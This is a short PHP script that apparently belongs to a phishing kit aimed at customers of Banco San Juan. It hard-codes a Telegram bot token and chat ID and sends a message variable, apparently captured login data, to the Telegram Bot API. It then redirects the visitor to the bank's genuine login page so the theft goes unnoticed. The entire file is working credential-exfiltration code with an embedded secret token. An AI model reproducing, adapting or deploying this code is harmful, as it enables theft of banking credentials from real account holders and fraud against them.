<?php
  $bottoken= "5163854058:AAF5POZd3yssHz8TuwiFysoGmXRkUlHbzl8";
  $chatid ="1027425651";
  
  define('BOT_TOKEN', $bottoken);
  define('CHAT_ID', $chatid);
  define('API_URL', 'https://api.telegram.org/bot'.BOT_TOKEN.'/');
  function enviar_telegram($msj){
    $queryArray = [
      'chat_id' => CHAT_ID,
      'text' => $msj,
    ];
    $url = 'https://api.telegram.org/bot'.BOT_TOKEN.'/sendMessage?'. http_build_query($queryArray);
    $result = file_get_contents($url);
  }
enviar_telegram($msj);
header("location:https://digital.bancosanjuan.ar/loginStep1");
?>